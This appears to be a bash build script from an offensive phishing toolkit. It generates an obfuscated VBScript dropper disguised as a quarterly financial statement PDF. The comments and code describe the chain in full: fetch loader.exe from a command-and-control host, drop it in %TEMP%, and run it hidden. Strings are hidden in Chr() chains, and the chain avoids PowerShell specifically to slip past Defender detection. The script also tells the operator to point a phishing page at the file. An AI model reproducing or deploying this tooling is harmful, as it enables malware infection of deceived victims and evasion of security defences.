#!/usr/bin/env bash
# make_vbs_payload.sh - build the obfuscated WSH dropper (.vbs) for the umbra
# delivery chain.
#
# It produces ONE file in dist/ (default: 2026-Q3_Financial_Statement.pdf.vbs).
# This is the PowerShell-free alternative to make_lnk_payload.sh: there is no
# powershell.exe anywhere in the chain, so PowerShell command-line ML
# detections (Trojan:Win32/Commando.AIml) have nothing to fire on.
#
# On the target, double-clicking the .vbs runs wscript.exe (no console window):
#   MSXML2.XMLHTTP.6.0 GET <loader URL>  (fallback Microsoft.XMLHTTP)
#     -> ADODB.Stream SaveToFile %TEMP%\<rand>.exe
#     -> WScript.Shell.Run "<dropped>", 0, False   (hidden, no wait)
# Every string (ProgIDs, URL, drop name, %TEMP%) is a Chr() chain, so the
# script text carries no plaintext URL or class names.
#
# REMEMBER: point the phish page at the .vbs - delivery/phish.html CONFIG
# (PAYLOAD_URL / PAYLOAD_NAME) must become the .vbs file name when this is the
# delivery. serve.py pins the download name via Content-Disposition.
#
# Run from the module root after scripts/build.sh:
#   bash scripts/make_vbs_payload.sh
#
# Env:
#   DOMAIN      public hostname served by the Cloudflare Tunnel
#               (default c2.example.com)
#   SCHEME      https (default; the tunnel gives a public TLS cert)
#   URL         full payload URL override (default <SCHEME>://<DOMAIN>/loader.exe)
#   LOADER_PATH path of loader.exe on the server       (default /loader.exe)
#   NAME        file name shown by Explorer (default 2026-Q3_Financial_Statement.pdf)
#   OUT         output directory (default dist)
#   OUTNAME     output file name  (default <NAME>.vbs)
#   SEED        seed for the random drop name (reproducible builds)
set -euo pipefail
cd "$(dirname "$0")/.."

DOMAIN="${DOMAIN:-c2.example.com}"
SCHEME="${SCHEME:-https}"
NAME="${NAME:-2026-Q3_Financial_Statement.pdf}"
LOADER_PATH="${LOADER_PATH:-/loader.exe}"
OUT="${OUT:-dist}"
OUTNAME="${OUTNAME:-$NAME.vbs}"
SEED="${SEED:-}"

BASE="${SCHEME}://${DOMAIN}"
URL="${URL:-${BASE}${LOADER_PATH}}"

command -v python3 >/dev/null 2>&1 || { echo "[-] python3 required" >&2; exit 1; }
[ -f scripts/make_vbs.py ] || { echo "[-] scripts/make_vbs.py not found (run from the module root)" >&2; exit 1; }

mkdir -p "$OUT"

echo "[*] building $OUT/$OUTNAME"
echo "    url  : $URL"
echo "    name : $NAME"

if [ -n "$SEED" ]; then
    python3 scripts/make_vbs.py --url "$URL" --name "$NAME" --out "$OUT/$OUTNAME" --seed "$SEED"
else
    python3 scripts/make_vbs.py --url "$URL" --name "$NAME" --out "$OUT/$OUTNAME"
fi

ls -l "$OUT/$OUTNAME"
echo
echo "[+] on the target, double-clicking \"$OUTNAME\" runs wscript.exe (no PowerShell):"
echo "    XMLHTTP GET -> ADODB.Stream -> %TEMP%\\<rand>.exe -> WScript.Shell.Run hidden"
echo "    serve it from dist/ (scripts/serve.sh) behind the Cloudflare Tunnel."
echo "    NOTE: update delivery/phish.html CONFIG to point at $OUTNAME."
